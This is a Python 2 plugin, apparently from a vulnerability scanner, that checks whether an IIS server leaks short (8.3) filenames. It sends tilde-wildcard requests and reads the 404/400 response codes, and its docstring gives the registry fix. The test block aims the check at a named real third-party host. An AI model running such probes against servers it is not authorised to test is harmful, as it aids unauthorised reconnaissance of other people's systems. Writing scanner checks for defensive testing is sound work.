#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Time    : 2018/12/20 17:31
@Author  : gzh
@contact : k39aE465wlulvnkhT0i9MQ==@qq.com
@Site    : https://www.freebuf.com/articles/4908.html
@File    : iis_short_file.py
@Desc    : Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。修复方法：修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1，重启服务器。
@Software: PyCharm
"""

from ..miniCurl import Curl
from ..t  import T

class P(T):
    def __init__(self):
        T.__init__(self)

    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        if int(port) == 443:
            arg = 'https://'+ip+':'+port
        else:
            arg = 'http://' + ip + ':' + port

        curl = Curl()
        result = {}
        result['result']=False

        try:
            if 'asp' in head.lower():
                code, head, res, errcode, _ = curl.curl(arg + '%2F*~1.*%2Fx.aspx')
                # 存在短文件名泄漏漏洞就会出现404页面
                if code == 404:
                    code, head, res, errcode, _ = curl.curl(arg + '%2Fabcd*~1.*%2Fx.aspx')
                    # 输入不存在的字母，ooxx则会出现400错误
                    if code == 400:
                        output(arg, result, 'warning')
        except Exception,e:
            print e
        del curl
        return result


def output(url,result,label):
    info = url + ' short file info '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type'] = 'asp short file info'
    result['VerifyInfo']['URL'] = url
    result['VerifyInfo']['payload'] = '/thirdparty/iis/iis_short_file.py'
    result['VerifyInfo']['level'] = label
    result['VerifyInfo']['result'] = info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_7b2f2e712d947a7ad946d1d754f62c7a.py
#/root/github/poccreate/codesrc/exp-52.py
